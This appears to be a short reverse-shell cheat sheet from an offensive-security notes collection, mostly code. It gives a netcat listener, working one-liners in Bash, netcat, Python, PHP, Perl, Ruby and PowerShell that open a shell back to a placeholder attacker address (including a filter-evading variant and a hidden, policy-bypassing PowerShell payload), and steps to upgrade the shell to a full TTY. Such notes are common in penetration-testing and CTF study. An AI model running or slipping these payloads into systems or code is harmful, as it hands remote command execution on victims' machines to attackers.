---
tags: [basics, technique, shell]
---

[[Basics/Index|← Basics]]

> [!info] See also: [[Shells and Payloads]] · [[Shell & Payloads]]


Whenever you want to set up a reverse shell you need a listening port on your attacker machine:

```bash
nc -lvnp <port>
# or with rlwrap for arrow keys / history
rlwrap nc -lvnp <port>
```

## One-Liners by Language

```bash
# Bash
bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1

# Bash via /dev/tcp (alternative encoding to bypass filters)
0<&196;exec 196<>/dev/tcp/<attacker-ip>/<port>; sh <&196 >&196 2>&196

# Netcat (traditional)
nc -e /bin/bash <attacker-ip> <port>

# Netcat (without -e, busybox)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <attacker-ip> <port> > /tmp/f

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker-ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("<attacker-ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="<attacker-ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("<attacker-ip>",<port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "& {$client = New-Object System.Net.Sockets.TCPClient('<attacker-ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
```

## Upgrading a Dumb Shell to a Full TTY

```bash
# Step 1: spawn a PTY (on target)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: background the shell and fix terminal (on attacker)
Ctrl+Z
stty raw -echo; fg

# Step 3: fix terminal size (on target)
export TERM=xterm
stty rows 38 columns 116
```